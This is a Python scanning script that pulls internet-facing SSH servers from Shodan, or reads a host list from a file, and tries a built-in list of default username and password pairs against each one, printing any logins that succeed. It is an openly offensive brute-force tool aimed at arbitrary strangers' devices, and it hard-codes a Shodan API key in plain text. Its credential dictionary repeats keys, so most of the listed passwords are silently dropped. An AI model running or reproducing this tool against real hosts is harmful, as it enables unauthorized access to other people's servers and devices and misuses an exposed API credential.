import shodan, paramiko, sys
from colorama import *

AlreadySeen = []

Credentials = {
	'root': 'root',
	'ubnt': 'ubnt',
	'admin': 'admin',
	'support': 'support',
	'admin': '1234',
	'admin': '12345',
	'root': 'user',
	'ubuntu': 'ubuntu',
	'root': 'realtek',
	'root': 'default',
	'admin': 'admin1234',
	'admin': 'admin12345',
	'root': '1234',
	'root': '12345'
}

APIKEY = "X6j7yol2NeFR2HW0h2o6FOqzgDqA8GIL"

init(convert=True)
api = shodan.Shodan(APIKEY)

class SSHDevice:
	def __init__(self, host, username, password):
		self.client = paramiko.SSHClient()
		self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		
		try:
			self.client.connect(hostname=host, username=username, password=password, timeout=1)

			print(f'{Fore.WHITE}[{Fore.GREEN}Scanner{Fore.WHITE}] {host} succeeded with {Fore.WHITE}{username}:{password}')
		except paramiko.ssh_exception.AuthenticationException:
			print(f'{Fore.WHITE}[{Fore.RED}Scanner{Fore.WHITE}] {host} authentication failed')
		except paramiko.ssh_exception.SSHException:
			print(f'{Fore.WHITE}[{Fore.RED}Scanner{Fore.WHITE}] ?{host}? is unreachable')
			AlreadySeen.append(host)
		except:
			print(f'{Fore.WHITE}[{Fore.RED}Scanner{Fore.WHITE}] {host} is unreachable')
			AlreadySeen.append(host)

if len(sys.argv) == 1:
	print(f'{Fore.WHITE}[{Fore.GREEN}Scanner{Fore.WHITE}] Sending query to shodan api.')
	result = api.search("ssh")
	total = '{0:,}'.format(result['total'])

	print(f'{Fore.WHITE}[{Fore.GREEN}Scanner{Fore.WHITE}] Finished query. {total} servers found!')
	for SSHServer in result['matches']:
		for username, password in Credentials.items():
			if SSHServer["ip_str"] in AlreadySeen:
				break;
			else:
				SSHDevice(SSHServer["ip_str"], username, password)
else:
	print(f'{Fore.WHITE}[{Fore.GREEN}Scanner{Fore.WHITE}] Reading file..')

	servers = []

	with open(sys.argv[1], 'r') as fp:
		for counter, line in enumerate(fp):
			servers.append(line.strip())

	print(f'{Fore.WHITE}[{Fore.GREEN}Scanner{Fore.WHITE}] Finished read!')
	for SSHServer in servers:
		for username, password in Credentials.items():
			if SSHServer in AlreadySeen:
				break;
			else:
				SSHDevice(SSHServer, username, password)
